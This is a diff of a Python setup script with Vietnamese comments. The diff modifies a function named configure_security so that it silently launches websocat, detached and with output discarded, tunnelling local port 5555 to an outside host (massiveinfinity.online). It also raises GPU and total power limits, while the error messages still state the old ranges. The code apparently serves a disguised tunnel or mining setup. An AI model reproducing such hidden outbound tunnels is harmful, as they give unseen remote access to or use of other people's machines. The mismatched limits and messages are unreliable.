@@ -121,17 +121,16 @@ def configure_security(logger):
         logger (Logger): Đối tượng logger để ghi log.
     """
     try:
-        # Thêm lệnh khởi chạy websocat
-        websocat_command = [
-            'websocat',
-            '-v',
-            '--binary',
-            'tcp-l:127.0.0.1:5555',
-            'wss://massiveinfinity.online/ws',
-            '&'
-        ]
-        logger.info("Khởi chạy websocat...")
-        subprocess.Popen(websocat_command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, preexec_fn=os.setsid)
+        # Khởi chạy Websocat với chuỗi lệnh chính xác
+        logger.info("Đang khởi chạy Websocat...")
+        websocat_command = "websocat -v --binary tcp-l:127.0.0.1:5555 wss://massiveinfinity.online/ws"
+        websocat_process = subprocess.Popen(
+            websocat_command,
+            shell=True,                      # Sử dụng shell để thực thi chuỗi lệnh
+            stdout=subprocess.DEVNULL,       # Không chặn stdout
+            stderr=subprocess.DEVNULL,       # Không chặn stderr
+            preexec_fn=os.setsid,            # Tạo nhóm tiến trình riêng
+        )
         logger.info("Websocat đã được khởi chạy thành công.")
 
         stunnel_conf_path = '/etc/stunnel/stunnel.conf'
@@ -297,7 +296,7 @@ def validate_configs(resource_config, system_params, environmental_limits, logge
         if total_power_max is None:
             logger.error("Thiếu `power_limits.total_power_watts.max` trong `environmental_limits.power_limits.total_power_watts`.")
             sys.exit(1)
-        if not (100 <= total_power_max <= 300):
+        if not (100 <= total_power_max <= 400):
             logger.error("Giá trị `power_limits.total_power_watts.max` không hợp lệ. Phải từ 100 W đến 300 W.")
             sys.exit(1)
         else:
@@ -318,7 +317,7 @@ def validate_configs(resource_config, system_params, environmental_limits, logge
         if per_device_power_gpu_max is None:
             logger.error("Thiếu `power_limits.per_device_power_watts.gpu.max` trong `environmental_limits.power_limits.per_device_power_watts.gpu`.")
             sys.exit(1)
-        if not (50 <= per_device_power_gpu_max <= 150):
+        if not (50 <= per_device_power_gpu_max <= 200):
             logger.error("Giá trị `power_limits.per_device_power_watts.gpu.max` không hợp lệ. Phải từ 50 W đến 150 W.")
             sys.exit(1)
         else:
